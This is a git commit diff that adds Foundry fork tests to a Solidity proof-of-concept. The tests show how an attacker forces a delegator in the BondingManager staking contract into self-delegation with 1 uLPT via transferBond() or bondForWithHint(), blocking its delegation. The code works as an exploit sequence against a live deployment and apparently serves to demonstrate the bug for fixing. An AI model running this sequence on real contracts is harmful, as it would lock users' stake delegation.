8fbfe53854f62aaaf83ff1c35ec81c91bf3be449
Yondon Fu <yondon.fu@gmail.com>
2023-06-27 15:33:13 -0400

    src/test: Add transferBond to forced self-delegation PoC fork test

--- src/test/BondingManagerForceSelfDelegationPoC.sol
+++ src/test/BondingManagerForceSelfDelegationPoC.sol
@@ -15,11 +15,22 @@ contract BondingManagerForceSelfDelegationPoC is GovernorBaseTest {
 
     address public constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;
 
-    function testPoC() public {
+    uint256 public testAccountCtr = 1;
+    address public attacker;
+    address public delegator;
+    address public transcoder;
+
+    function newAddr() public returns (address) {
+        address addr = CHEATS.addr(testAccountCtr);
+        testAccountCtr++;
+        return addr;
+    }
+
+    function setUp() public {
         // Setup accounts
-        address attacker = CHEATS.addr(1);
-        address delegator = CHEATS.addr(2);
-        address transcoder = CHEATS.addr(3);
+        attacker = newAddr();
+        delegator = newAddr();
+        transcoder = newAddr();
 
         uint256 mockAllow = 1000;
 
@@ -33,7 +44,9 @@ contract BondingManagerForceSelfDelegationPoC is GovernorBaseTest {
 
         CHEATS.prank(delegator);
         TOKEN.approve(address(BONDING_MANAGER), mockAllow);
+    }
 
+    function testBondForWithHintPoC() public {
         // Attacker calls bondForWithHint() to force the delegator to self-delegate at the cost of 1 uLPT
         CHEATS.prank(attacker);
         BONDING_MANAGER.bondForWithHint(1, delegator, delegator, address(0), address(0), address(0), address(0));
@@ -63,6 +76,48 @@ contract BondingManagerForceSelfDelegationPoC is GovernorBaseTest {
         BONDING_MANAGER.rebondFromUnbonded(transcoder, 0);
 
         // Attacker can prevent a delegator address from delegating to a separate address by calling bondForWithHint() to force the address to self-delegate at the cost of 1 uLPT
+        // whenever the delegator address is in the Unbonded state
+    }
+
+    function testTransferBondPoC() public {
+        // Attacker needs to delegate to the delegator first before it can call transferBond()
+        CHEATS.prank(attacker);
+        BONDING_MANAGER.bond(100, delegator);
+
+        // Attacker needs to wait 1 round before it can call transferBond()
+        // This is the next round start block assuming 104182839 is the fork block number
+        uint256 nextRoundStartBlock = 17545330;
+        CHEATS.roll(nextRoundStartBlock);
+        ROUNDS_MANAGER.initializeRound();
+
+        // Attacker calls transferBond() to force the delegator to self-delegate at the cost of 1 uLPT
+        CHEATS.prank(attacker);
+        BONDING_MANAGER.transferBond(delegator, 1, address(0), address(0), address(0), address(0));
+
+        // Delegator bond() tx fails because it is now a registered transcoder and is trying to change delegation
+        CHEATS.startPrank(delegator);
+        CHEATS.expectRevert("registered transcoders can't delegate towards other addresses");
+        BONDING_MANAGER.bond(1, transcoder);
+
+        // Delegator needs to wait until next round to unbond
+        nextRoundStartBlock = 17545330 + ROUNDS_MANAGER.roundLength();
+        CHEATS.roll(nextRoundStartBlock);
+        ROUNDS_MANAGER.initializeRound();
+
+        BONDING_MANAGER.unbond(1);
+        CHEATS.stopPrank();
+
+        // Attacker calls transferBond() to force delegator to self-delegate AFTER the full unbond and BEFORE the rebondFromUnbonded() call
+        CHEATS.prank(attacker);
+        BONDING_MANAGER.transferBond(delegator, 1, address(0), address(0), address(0), address(0));
+
+        // Delegator can call rebondFromUnbonded() with its unbonding lock to delegate to a different address, but...
+        // Delegator rebondFromUnbonded() tx fails because it needs to be in the Unbonded state and the attacker's tx forced it into the Pending state
+        CHEATS.startPrank(delegator);
+        CHEATS.expectRevert("caller must be unbonded");
+        BONDING_MANAGER.rebondFromUnbonded(transcoder, 0);
+
+        // Attacker can prevent a delegator address from delegating to a separate address by calling transferBond() to force the address to self-delegate at the cost of 1 uLPT
         // whenever the delegator address is in the Unbonded state
     }
 }
